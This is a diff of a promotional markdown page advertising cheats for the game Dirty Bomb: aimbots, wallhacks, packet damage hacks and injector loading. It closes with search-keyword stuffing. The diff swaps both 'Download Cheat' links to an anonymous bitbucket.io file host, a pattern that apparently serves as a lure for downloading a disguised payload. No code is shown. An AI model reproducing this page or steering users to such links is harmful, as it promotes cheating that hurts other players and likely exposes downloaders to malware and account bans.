@@ -2,7 +2,7 @@
 
 Despite being older, **Dirty Bomb** still sees active cheat development—private aimbots, ESP, wallhacks, and even hostile packet-based damage hacks continue circulating . Here’s the breakdown:
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/dirty-bomb/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 🔧 Cheat Features & Mechanics
@@ -28,7 +28,7 @@ Despite being older, **Dirty Bomb** still sees active cheat development—privat
 * Loaded via **EXLoader** or external injectors
 * **Insert/Home key UI menu** for toggles and settings 
 
-[![Download Cheat](https://i.ytimg.com/vi/K3IBvpEsglk/maxresdefault.jpg)](https://wecheaters.github.io/cheats/dirty-bomb/)
+[![Download Cheat](https://i.ytimg.com/vi/K3IBvpEsglk/maxresdefault.jpg)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 💬 What Players Say
@@ -84,3 +84,4 @@ Even years after release, **Dirty Bomb cheats remain alive**—a combination of 
 Dirty Bomb cheat, aimbot Dirty Bomb, ESP wallhack, no recoil, damage packet hack, radar cheat, EXLoader, private cheat build, Steam ban, undetected Dirty Bomb hack
 
 ---
+
